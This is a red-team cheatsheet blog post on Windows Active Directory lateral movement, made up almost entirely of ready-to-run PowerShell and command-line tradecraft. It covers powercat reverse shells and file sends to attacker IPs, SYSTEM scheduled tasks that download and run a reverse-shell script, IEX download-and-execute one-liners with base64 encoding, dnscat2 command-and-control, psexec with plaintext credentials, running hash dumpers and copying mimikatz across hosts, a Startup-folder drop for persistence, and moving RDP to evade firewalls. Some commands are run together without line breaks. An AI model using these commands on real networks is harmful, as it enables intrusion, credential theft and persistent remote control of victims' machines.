---
title: Domain Lateral Movement cheatsheet
subtitle: Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets.

# Summary for listings and search engines
summary: Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets.

# Link this post with a project
projects: []

# Date published
date: '2022-07-24T00:00:00Z'

# Date updated
lastmod: '2022-07-24T00:00:00Z'

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Giovanni Pecoraro**](https://unsplash.com/photos/CpkOjOcXdUY)'
  focal_point: ''
  placement: 2
  preview_only: false

authors:
  - admin

tags:
  - Cheatsheet
  - Red Teaming
  - Windows
  - Active Directory
  - Lateral Movement
  
categories:
  - Cyber Security
  - Red Teaming

---

## Local Files

Find local senstive files on computers:

```powershell
# PowerView
Get-ChildItem -Filter *.xml -Path c:\ -RecurseGet-ChildItem -Filter *unattend*.xml -Path c:\ -Recurse
```

## AppLocker

Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at [LOLBAS](https://lolbas-project.github.io/) if only signed binaries are allowed:

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Port Scanning

Check machine reachability:

```powershell
Test-NetConnection "COMPUTER1" -Port 3389
```

Perform a port scanning:

```powershell
# PowerSploit
## Open and filtered ports
Invoke-Portscan -Hosts @("COMPUTER1","COMPUTER2") -TopPorts 200 | %{echo $_.Hostname; echo "--- OPEN ---"; echo $_.openPorts; echo "--- FILTERED ---"; echo $_.filteredPorts; echo "------------"; echo ""}
Invoke-Portscan -Hosts @("COMPUTER1","COMPUTER2") -Ports "21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901" | %{echo $_.Hostname; echo "--- OPEN ---"; echo $_.openPorts; echo "--- FILTERED ---"; echo $_.filteredPorts; echo "------------"; echo ""}

## Only open ports
Invoke-Portscan -Hosts @("COMPUTER1","COMPUTER2") -TopPorts 200 | %{echo $_.Hostname; echo "--- OPEN ---"; echo $_.openPorts; echo "------------"; echo ""}Invoke-Portscan -Hosts @(Get-NetComputer) -TopPorts 200 | %{echo $_.Hostname; echo "--- OPEN ---"; echo $_.openPorts; echo "------------"; echo ""}
Invoke-Portscan -Hosts @("COMPUTER1","COMPUTER2") -Ports "21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901" | %{echo $_.Hostname; echo "--- OPEN ---"; echo $_.openPorts; echo "------------"; echo ""}
Invoke-Portscan -Hosts @(Get-NetComputer) -Ports "21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985" | %{echo $_.Hostname; echo "--- OPEN ---"; echo $_.openPorts; echo "------------"; echo ""}

## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24)
```

## Port forwarding

```powershell
# Forward a port to another host/port
net sh interface portproxy add v4tov4 listenport=80 listenaddress=192.168.1.9 connectport=5985 connectaddress=192.168.1.10

## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth
Set-Item wsman:\localhost\Client\TrustedHosts -value *
$securePassword = ConvertTo-SecureString "Password" -AsPlainText -force
$credential = New-Object System.Management.Automation.PsCredential("cyberlab\STUDENT1",$securePassword)
Enter-PSSession -ComputerName 192.168.1.9 -Port 80 -Credential $securePassword

# Show all forwardings
netsh interface portproxy show all

# Delete all forwardings
netsh interface portproxy reset

# Delete a specific forwardingnet
sh interface portproxy delete v4tov4 listenport=80 listenaddress=192.168.1.9
```

## PSRemoting

*Requires ‘HTTP’ and ‘WSMAN’ SPNs*

Enable PSRemoting on local machine and adds exception to the firewall:

```powershell
Enable-PSRemoting
```

Create a PSSession:

```powershell
$sess = New-PSSession -ComputerName "COMPUTER1" -Credential "cyberlab\STUDENT1"
```

Enter a PSSession:

```powershell
Enter-PSSession -ComputerName "COMPUTER1"-Credential "cyberlab\STUDENT1" -Session $sess
```

Use below to execute commands or scriptblocks:

```powershell
Invoke-Command -ComputerName (Get-Content ".\list_of_computers.txt") -ScriptBlock {Get-Process}
Invoke-Command -ComputerName "COMPUTER1" -ScriptBlock {whoami;hostname}
```

Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):

```powershell
$securePassword = ConvertTo-SecureString "Password" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PsCredential("cyberlab\STUDENT1",$securePassword)
Invoke-Command -ComputerName "COMPUTER1" -ScriptBlock {whoami;hostname} -Credential $credential
```

or to start a new session:

```powershell
$Sess = New-PSSession -Computername "COMPUTER1" -Credential $credentialInvoke-Command -Session $sess -ScriptBlock {whoami}
```

Use below to execute scripts from files:

```powershell
Invoke-Command -FilePath "C:\scripts\Get-PassHashes.ps1" -ComputerName (Get-Content ".\list_of_computers.txt")
```

Use below to execute locally loaded function on the remote machines:

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content ".\list_of_computers.txt")
```

In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content ".\list_of_computers.txt") -ArgumentList
```

Execute “Stateful” commands using Invoke-Command:

```powershell
$Sess = New-PSSession -Computername "COMPUTER1"Invoke-Command -Session $Sess -ScriptBlock {$Proc = GetProcess}Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

Copy files between PSRemoting sessions:

```powershell
$Sess = New-PSSession -Computername "COMPUTER1"
Copy-Item -Path C:\Users\Public\Inveigh-NTLMv2.txt -Destination C:\Users\user01\Desktop\ -FromSession $sess
Copy-Item -Path C:\Users\user01\Desktop\mimikatz.exe -Destination C:\Users\Public\ -ToSession $sess
```

## PsExec

Launch a shell on the local machine as DIFFERENT user:

```powershell
psexec.exe -u "CYBERLAB\student1" -p "Password123." -i -d cmd.exe
psexec.exe -u "CYBERLAB\student1" -p "Password123." -i -d powershell.exe
```

Launch a SYSTEM shell on the local machine:

```powershell
psexec.exe -s -i -d cmd.exe
psexec.exe -s -i -d powershell.exe
```

If you get the admin/password of a RID 500 user of a machine, it is possible to get a SYSTEM session on that machine by `psexec`. It is also possible to use a `cmd` or `powershell` session launched from `mimikatz` after Pass-The-Hash.

Execute command in remote computer:

```powershell
psexec.exe \\COMPUTER1 -u [USER] -p [PASSWORD] [COMMAND]
```

Execute command ‘netstat -an’ in remote and output result in local computer:

```powershell
psexec.exe \\COMPUTER1 -u [USER] -p [PASSWORD] netstat -an > c:\file.txt
```

Execute command in remote and output result in remote:

```powershell
psexec.exe \\COMPUTER1 -u [USER] -p [PASSWORD] cmd /c netstat -an ^>c:\file.txt
```

Execute program to interact with user:

```powershell
psexec.exe \\COMPUTER1 -u [USER] -p [PASSWORD] -d -i notepad
```

Run remote shell:

```powershell
psexec.exe \\COMPUTER1 -u [USER] -p [PASSWORD] cmd
```

## PowerCat

Import the PowerCat module:

```powershell
. .\powercat.ps1
```

Listen on port 8000 and print the output to the console. Rememeber to add -t (timeout) parameter: number of seconds to wait before giving up on listening or connecting:

```powershell
powercat -l -p 8000 -t 1000
```

Connect to 10.1.1.1 port 443, send a shell, and enable verbosity:

```powershell
powercat -c 10.1.1.1 -p 443 -e cmd -v
```

Connect to 10.1.1.1 port 443, execute a pseudo Powershell session, and enable verbosity:

```powershell
powercat -c 10.1.1.1 -p 443 -ep -v
```

Send a file to 10.1.1.15 port 8000:

```powershell
powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
```

Write the data sent to the local listener on port 4444 to C::

```
powercat -l -p 4444 -of C:\outfile
```

Listen on port 8000 and repeatedly server a powershell shell:

```powershell
powercat -l -p 8000 -ep -rep
```

Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp:

```powershell
powercat -l -p 8000 -r tcp:10.1.1.1:9000
```

Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53 (Get the server here: https://github.com/iagox86/dnscat2):

```powershell
powercat -c 10.1.1.1 -p 53 -dns c2.example.com
```

Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53:

```powershell
powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
```

(-d) Disconnect. powercat will disconnect after the connection is established and the input from -i is sent. Used for scanning.

Generate Payload. Returns a script as a string which will execute the powercat with the options you have specified. -i, -d, and -rep will not be incorporated:

```powershell
powercat -c 10.1.1.1 -p 443 -ep -g
```

Generate Encoded Payload. Does the same as -g, but returns a string which can be executed in this way: powershell -E

```powershell
powercat -c 10.1.1.1 -p 443 -ep -ge
```

Basic TCP Port Scanner:

```powershell
(21,22,80,443) | % {powercat -c 10.1.1.10 -p $_ -t 1 -Verbose -d}
```

Start A Persistent Server That Serves a File:

```powershell
powercat -l -p 443 -i C:\inputfile -rep
```

## Remote Desktop

Enable RDP on a machine:

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Change RDP port to 55555 (in order to bypass firewalls):

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name PortNumber -Value 55555
New-NetFirewallRule -DisplayName "New RDP Port 55555" -Direction Inbound -LocalPort 55555 -Protocol TCP -Action allow
New-NetFirewallRule -DisplayName "New RDP Port 55555" -Direction Inbound -LocalPort 55555 -Protocol UDP -Action allow
net stop termservice /ynet start termservice /y
```

## Scheduled Tasks

Launch a scheduled task on a remote host to download and execute the script for a reverse shell:

```powershell
# File share via Web Server
schtasks /delete /S "COMPUTER01" /TN "JAVA_CHECK"schtasks /create /S "COMPUTER01" /SC Minute /RU "NT Authority\SYSTEM" /TN "JAVA_CHECK" /TR "powershell.exe -ep bypass -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.53/powercat_connect.ps1''')'"schtasks /run /S "COMPUTER01" /TN "JAVA_CHECK"# File share via SMBNew-SmbShare -Path c:\users\student01\Desktop\shared -Name shared -FullAccess Everyoneschtasks /delete /S "COMPUTER01" /TN "JAVA_CHECK"# Only domain users can access the file share.# To run as SYSTEM the file must reside on the remote machine.schtasks /create /S "COMPUTER01" /SC Minute /RU "CYBERLAB\Administrator" /TN "JAVA_CHECK" /TR "powershell.exe -ep bypass -c '. \\192.168.50.53\shared\powercat.ps1; powercat -c 192.168.50.53 -p 443 -e cmd'"schtasks /run /S "COMPUTER01" /TN "JAVA_CHECK"
```

## WMI

*Requires ‘Host’ and ‘RPCSS’ SPNs*

```powershell
Invoke-WmiMethod win32_process -ComputerName "COMPUTER01.CYBERLAB.LOCAL" -name create -argumentlist "powershell.exe -e $encodedCommand"
```

## File download

Simple download:

```powershell
# Any version
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")

# Powershell 4+
## You can use 'IWR' as a shorthand
Invoke-WebRequest "http://10.10.16.7/Incnspc64.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe"
```

Load file reflectively:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.ps1')
```

Encode one-liner:

```powershell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encodedCommand
```

## SMB Shares

Create a SMB share:

```powershell
# MACHINE: COMPUTER1
New-SmbShare -Name "SHARED_REPO" -Path "C:\Users\Public\" -FullAccess "CYBERLAB\STUDENT1"
Grant-SmbShareAccess -Name "SHARED_REPO" -AccountName "CYBERLAB\STUDENT2" -AccessRight Full
New-SmbShare -Name "SHARED_REPO" -Path "C:\Users\Public\" -FullAccess "Everyone"
```

Connect to a SMB share:

```powershell
# USER: CYBERLAB\STUDENT1
net use z: \\COMPUTER1\SHARED_REPO
net use z: \\COMPUTER1\SHARED_REPO /u:CYBERLAB\STUDENT01 Password123.
```

or:

```powershell
New-SmbMapping -LocalPath "x:" -RemotePath "\\COMPUTER1\SHARED_REPO" -Username "CYBERLAB\STUDENTI1" -Password "Password123."
```

## PowerShell WebServer

Start a web server on port 8080 in order to share files:

```powershell
# MACHINE: COMPUTER1
# Start-WebServer.ps1
.\Start-WebServer.ps1 "http://+:8080/"
```

Download a file from another machine:

```powershell
# MACHINE: COMPUTER 2
Invoke-WebRequest -Uri http://COMPUTER1:8080/file.ps1 -OutFile .\file.ps1
iex (New-Object Net.WebClient).DownloadString('http://COMPUTER1:8080/PowerUp.ps1');
Invoke-AllChecks

# It can be even used from an MSSQL instance
Execute-Command-MSSQL -UserName 'sa' -Password 'Password' -ComputerName 'MSSQLSERVER01' -payload "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/PowerUp.ps1'); Invoke-AllChecks"
```

Close the web server:

```powershell
# MACHINE: COMPUTER 2
Invoke-WebRequest -Uri http://COMPUTER1:8080/quit
```

## Base64 script conversion

In order to perform remote code execution it can be helpful to convert a script in *Base64* format:

```powershell
$Base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\script\file.ps1'));
powershell -EncodedCommand <Base64String>
```
---